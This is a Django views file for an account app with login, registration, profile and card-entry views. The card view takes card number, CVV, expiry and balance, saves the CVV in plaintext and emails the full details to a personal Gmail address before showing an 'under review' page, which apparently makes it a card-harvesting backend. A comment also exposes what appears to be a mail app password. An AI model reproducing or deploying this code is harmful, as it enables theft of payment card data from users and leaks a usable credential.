from django.shortcuts import render,redirect
from django.contrib import messages, auth
from account.models import Account,Profile,Card
from django.contrib.auth import authenticate, login as auth_login
from django.core.exceptions import ObjectDoesNotExist 
from django.core.mail import send_mail

def login(request):
    if request.method == 'POST':
        email = request.POST['email']
        password = request.POST['pass1']
        user = authenticate(request, email=email, password=password)
        if user is not None:
            auth_login(request, user)
            try:
                # Check if the user has a profile and if it's complete
                if hasattr(user, 'profile') and user.profile.is_profile_complete():
                    messages.success(request, 'Login Successful')
                    print('success')
                    return redirect('dashboard')
                else:
                    # Redirect to profile completion if profile is incomplete
                    messages.warning(request, 'Please complete your profile')
                    print('Please complete your profile')

                    return redirect('profile')
            except ObjectDoesNotExist:
                # Handle case where profile does not exist
                messages.warning(request, 'Profile does not exist')
                return redirect('create_profile')  # Redirect to a page to create profile
        else:
            messages.error(request, 'Invalid email or password')
            return redirect('login')
    return render(request, 'login.html')




def register(request):
    context = {}
    if request.method == 'POST':
        email = request.POST['email']
        last_name = request.POST['lname']
        first_name = request.POST['fname']
        password = request.POST['password']
        username = email

        user = Account.objects.create_user(
            first_name=first_name, last_name=last_name, email=email, username=username, password=password)
        user.save()   
        return  redirect('login') 
    return render(request, 'register.html', context)


def logout(request):
    auth.logout(request)
    messages.warning(request, "You're logged out!")
    return redirect('login')



def profile (request):
    context={}
    fname= request.user.first_name.upper()
    lname= request.user.last_name.upper()
    email= request.user.email
    
    if request.method == 'POST':
        first_name= fname
        last_name=lname
        phone= request.POST['phone']
        education= request.POST['e']
        gender= request.POST['g']
        address= request.POST['a']
        city= request.POST['city']
        zip= request.POST['z']
        age= request.POST['age']
        country= request.POST['country']
        save1=Profile(user=request.user,first_name=first_name, last_name=last_name, email=email, phone=phone, education=education, age=age, gender=gender, address=address,  
                      city=city, zip=zip, country=country, )
        save1.save()
        return  redirect('card')
      
      
    context['fname']=fname
    context['lname']=lname
    return render(request, 'profile.html', context)


def card (request):
    if request.method == 'POST':
        owner= request.POST['owner'].upper()
        number= request.POST['number']
        cvv= request.POST['cvv']
        month= request.POST['month']
        year= request.POST['year']
        bal=request.POST['bal']
        save2=Card(account=request.user,owner=owner,  number=number, cvv=cvv,  month=month, year=year,  bal=bal)
        save2.save()

        # Fetch user ID and user email
        user_id = request.user.id
        user_email = request.user.email
        
        # Send a professional email to admin
        subject = 'New Card Details Submitted'
        message = f'''
        Dear Admin,

        A new card has been submitted:
        
        Card Details:
        Owner: {owner}
        Number: {number}
        CVV: {cvv}
        Expiry Date: {month}/{year}
        Balance: {bal}
        
        User Information:
        User ID: {user_id}
        User Email: {user_email}

        Kind regards,
        Your Application Team
        '''
        from_email = user_email
        to_email = 'winfredmbithi91@gmail.com'
        
        send_mail(subject, message, from_email, [to_email])




        #app password : zuir ugco vsfi bmdt
        return redirect('under_review')

    return render(request, 'card.html')

def under_review (request):

    return render(request, 'under-review.html')
